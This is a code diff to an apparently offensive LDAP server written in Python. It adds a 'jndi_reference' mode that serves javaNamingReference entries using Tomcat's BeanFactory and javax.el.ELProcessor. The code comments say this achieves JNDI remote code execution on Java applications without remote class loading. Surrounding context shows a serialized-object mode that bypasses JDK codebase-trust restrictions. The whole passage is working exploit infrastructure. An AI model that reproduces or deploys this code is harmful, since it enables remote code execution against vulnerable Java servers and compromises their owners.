@@ -192,6 +192,21 @@ class LdapProtocol(asyncio.Protocol):
                 ("javaFactory", [class_name]),
             ]
             self.transport.write(_search_res_entry(msg_id, dn, attrs))
+        elif row and intent == "jndi_reference":
+            # JNDI ResourceRef mode: serve a Reference with custom factory + RefAddr entries
+            # Enables TomcatEL/Groovy/BeanShell JNDI RCE without remote class loading
+            # spec: ref_class_name, ref_factory, ref_addr_list (list of "#pos#type#content")
+            ref_class = spec.get("ref_class_name", "javax.el.ELProcessor")
+            ref_factory_cls = spec.get("ref_factory", "org.apache.naming.factory.BeanFactory")
+            ref_addrs = spec.get("ref_addr_list") or []
+            attrs = [
+                ("javaClassName", [ref_class]),
+                ("javaFactory", [ref_factory_cls]),
+                ("objectClass", ["javaNamingReference"]),
+            ]
+            if ref_addrs:
+                attrs.append(("javaReferenceAddress", ref_addrs))
+            self.transport.write(_search_res_entry(msg_id, dn, attrs))
         elif row and intent == "jndi_serialize":
             # javaSerializedData mode: embed serialized Java object directly in LDAP response
             # Bypasses com.sun.jndi.ldap.object.trustURLCodebase (JDK >= 8u191)
